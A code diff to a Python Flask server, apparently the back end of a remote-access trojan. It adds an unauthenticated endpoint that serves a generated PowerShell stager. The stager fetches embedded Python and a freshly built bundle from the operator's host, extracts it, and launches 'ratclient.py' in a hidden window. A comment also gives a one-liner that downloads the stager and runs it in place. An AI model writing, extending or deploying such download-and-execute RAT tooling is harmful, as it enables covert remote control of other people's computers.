@@ -162,6 +162,48 @@ def create_agent_blueprint(server_instance):
         except Exception as e:
             return responder.map_common_error(e)
 
+    @blueprint.post('/api/agent/bootstrap/ps1')
+    @allow_anonymous
+    def generate_bootstrap_ps1():
+        try:
+            payload = get_json_payload()
+            server_host = (payload.get('server_host') or '').strip()
+            server_port = payload.get('server_port')
+            web_port = payload.get('web_port')
+
+            if not server_host:
+                return responder.fail('server_host is required', 400)
+            if not server_port:
+                return responder.fail('server_port is required', 400)
+            if not web_port:
+                return responder.fail('web_port is required', 400)
+
+            try:
+                server_port = int(server_port)
+                web_port = int(web_port)
+            except (ValueError, TypeError):
+                return responder.fail('server_port and web_port must be integer', 400)
+
+            script_content = generate_bootstrap_ps1_script(
+                server_host, server_port, web_port
+            )
+
+            import tempfile
+            with tempfile.NamedTemporaryFile(
+                    mode='w', suffix='.ps1', delete=False, encoding='utf-8'
+            ) as f:
+                f.write(script_content)
+                temp_path = f.name
+
+            return send_file(
+                temp_path,
+                as_attachment=True,
+                download_name='bootstrap.ps1',
+                mimetype='text/plain'
+            )
+        except Exception as e:
+            return responder.map_common_error(e)
+
     return blueprint
 
 
@@ -299,3 +341,193 @@ if __name__ == "__main__":
     main()
 '''
     return script
+
+
+#one liner :$ip="192.168.2.242";$p=5173;iwr "http://${ip}:${p}/api/agent/bootstrap/ps1" -Method Post -ContentType "application/json" -UseBasicParsing -Body "{`"server_host`":`"$ip`",`"server_port`":9999,`"web_port`":$p}" -OutFile "$env:TEMP\bootstrap.ps1"; & "$env:TEMP\bootstrap.ps1"
+def generate_bootstrap_ps1_script(server_host, server_port, web_port):
+    script = f'''$ip="{server_host}"
+$webPort={web_port}
+$serverPort={server_port}
+$bundleDir="$env:USERPROFILE\\client_bundle"
+$pyDir="$bundleDir\\python-embed"
+$releaseDir="$bundleDir\\releases"
+mkdir $bundleDir,$releaseDir -Force | Out-Null
+
+function Unzip-File($zipPath, $destPath) {{
+    mkdir $destPath -Force | Out-Null
+    Add-Type -AssemblyName System.IO.Compression.FileSystem
+    [System.IO.Compression.ZipFile]::ExtractToDirectory($zipPath, $destPath)
+}}
+
+# 1. Prepare Python
+$py = $null
+if (Get-Command python -ErrorAction SilentlyContinue) {{
+    $py = "python"
+    Write-Host "Found local Python: $py"
+}} elseif (Get-Command python3 -ErrorAction SilentlyContinue) {{
+    $py = "python3"
+    Write-Host "Found local Python: $py"
+}}
+
+if (-not $py) {{
+    if (Test-Path "$pyDir\\python.exe") {{
+        $py = "$pyDir\\python.exe"
+        Write-Host "Using cached embedded Python: $py"
+    }} else {{
+        $found = Get-ChildItem $pyDir -Filter "python.exe" -Recurse -ErrorAction SilentlyContinue | Select-Object -First 1
+        if ($found) {{
+            $py = $found.FullName
+            Write-Host "Using cached embedded Python: $py"
+        }}
+    }}
+}}
+
+if (-not $py) {{
+    Write-Host "No Python found, downloading embedded Python..."
+    $pyZip = "$bundleDir\\python-embed.zip"
+    mkdir $pyDir -Force | Out-Null
+    iwr "http://$ip`:$webPort/api/external-tools/python-embed/download?platform=win&arch=amd64" -OutFile $pyZip -UseBasicParsing
+    if (-not (Test-Path $pyZip)) {{
+        Write-Host "ERROR: Download failed"
+        exit 1
+    }}
+    Write-Host "Downloaded, extracting..."
+    Unzip-File $pyZip $pyDir
+    $py = Get-ChildItem $pyDir -Filter "python.exe" -Recurse | Select-Object -First 1 -ExpandProperty FullName
+    if (-not $py) {{
+        Write-Host "ERROR: python.exe not found after extraction"
+        exit 1
+    }}
+    Remove-Item $pyZip -Force
+    Write-Host "Embedded Python ready: $py"
+}}
+
+# 2. Request bundle build
+Write-Host "Requesting bundle build..."
+$buildBody = "{{`"server_host`":`"$ip`",`"server_port`":$serverPort,`"web_port`":$webPort,`"target_os`":`"bundle`",`"builder`":`"bundle`",`"target_arch`":`"`",`"source`":`"bootstrap`",`"server_web_scheme`":`"http`",`"server_web_host`":`"$ip`"}}"
+$buildResp = iwr "http://$ip`:$webPort/api/agent/build" -Method Post -ContentType "application/json" -UseBasicParsing -Body $buildBody
+$buildData = $buildResp.Content | ConvertFrom-Json
+
+if ($buildData.code -ne 0) {{
+    Write-Host "Build failed: $($buildData.message)"
+    exit 1
+}}
+
+$downloadUrl = $buildData.data.download_url
+$fileName = $buildData.data.file_name
+$buildVersion = $buildData.data.build_version
+
+if (-not $downloadUrl.StartsWith("http")) {{
+    $downloadUrl = "http://$ip`:$webPort$downloadUrl"
+}}
+
+Write-Host "Build version: $buildVersion"
+
+# 3. Download bundle (always download latest)
+$zipPath = "$releaseDir\\$fileName"
+Write-Host "Downloading bundle..."
+iwr $downloadUrl -OutFile $zipPath -UseBasicParsing
+if (-not (Test-Path $zipPath)) {{
+    Write-Host "ERROR: Bundle download failed"
+    exit 1
+}}
+
+# 4. Extract (skip if already extracted)
+$extractDir = "$releaseDir\\$buildVersion"
+$ratclient = "$extractDir\\ratclient.py"
+if (Test-Path $ratclient) {{
+    Write-Host "Bundle already extracted, skipping..."
+}} else {{
+    Write-Host "Extracting to $extractDir..."
+    Unzip-File $zipPath $extractDir
+}}
+
+# 5. Launch ratclient
+if (-not (Test-Path $ratclient)) {{
+    Write-Host "ERROR: ratclient.py not found: $ratclient"
+    exit 1
+}}
+
+Write-Host "Launching ratclient..."
+Start-Process -FilePath $py -ArgumentList $ratclient -WorkingDirectory $extractDir -WindowStyle Hidden
+Write-Host "Bootstrap complete."
+'''
+    return script
+#
+# def generate_bootstrap_ps1_script(server_host, server_port, web_port):
+#     script = f'''$ip="{server_host}"
+# $webPort={web_port}
+# $serverPort={server_port}
+# $bundleDir="$env:USERPROFILE\\client_bundle"
+# $pyDir="$bundleDir\\python-embed"
+# $pyExe="$pyDir\\python.exe"
+# $releaseDir="$bundleDir\\releases"
+# mkdir $bundleDir,$releaseDir -Force | Out-Null
+#
+# # 1. Prepare Python
+# if (Get-Command python -ErrorAction SilentlyContinue) {{
+#     $py = "python"
+#     Write-Host "Found local Python: $py"
+# }} elseif (Get-Command python3 -ErrorAction SilentlyContinue) {{
+#     $py = "python3"
+#     Write-Host "Found local Python: $py"
+# }} elseif (Test-Path $pyExe) {{
+#     $py = $pyExe
+#     Write-Host "Using cached embedded Python: $py"
+# }} else {{
+#     Write-Host "No Python found, downloading embedded Python..."
+#     $pyZip = "$pyDir\\python-embed.zip"
+#     mkdir $pyDir -Force | Out-Null
+#     iwr "http://$ip`:$webPort/api/external-tools/python-embed/download?platform=win&arch=amd64" -OutFile $pyZip -UseBasicParsing
+#     Write-Host "Downloaded, extracting..."
+#     Expand-Archive $pyZip $pyDir -Force
+#     $py = $pyExe
+#     Write-Host "Embedded Python ready: $py"
+# }}
+#
+# # 2. Request bundle build
+# Write-Host "Requesting bundle build..."
+# $buildBody = "{{`"server_host`":`"$ip`",`"server_port`":$serverPort,`"web_port`":$webPort,`"target_os`":`"bundle`",`"builder`":`"bundle`",`"target_arch`":`"`",`"source`":`"bootstrap`",`"server_web_scheme`":`"http`",`"server_web_host`":`"$ip`"}}"
+# $buildResp = iwr "http://$ip`:$webPort/api/agent/build" -Method Post -ContentType "application/json" -UseBasicParsing -Body $buildBody
+# $buildData = $buildResp.Content | ConvertFrom-Json
+#
+# if ($buildData.code -ne 0) {{
+#     Write-Host "Build failed: $($buildData.message)"
+#     exit 1
+# }}
+#
+# $downloadUrl = $buildData.data.download_url
+# $fileName = $buildData.data.file_name
+# $buildVersion = $buildData.data.build_version
+#
+# if (-not $downloadUrl.StartsWith("http")) {{
+#     $downloadUrl = "http://$ip`:$webPort$downloadUrl"
+# }}
+#
+# Write-Host "Build version: $buildVersion"
+#
+# # 3. Download bundle
+# $zipPath = "$releaseDir\\$fileName"
+# Write-Host "Downloading bundle..."
+# iwr $downloadUrl -OutFile $zipPath -UseBasicParsing
+#
+# # 4. Extract
+# $extractDir = "$releaseDir\\$buildVersion"
+# if (Test-Path $extractDir) {{
+#     Remove-Item $extractDir -Recurse -Force
+# }}
+# Write-Host "Extracting to $extractDir..."
+# Expand-Archive $zipPath $extractDir -Force
+#
+# # 5. Launch ratclient
+# $ratclient = "$extractDir\\ratclient.py"
+# if (-not (Test-Path $ratclient)) {{
+#     Write-Host "ratclient.py not found: $ratclient"
+#     exit 1
+# }}
+#
+# Write-Host "Launching ratclient..."
+# Start-Process -FilePath $py -ArgumentList $ratclient -WorkingDirectory $extractDir -WindowStyle Hidden
+# Write-Host "Bootstrap complete."
+# '''
+#     return script
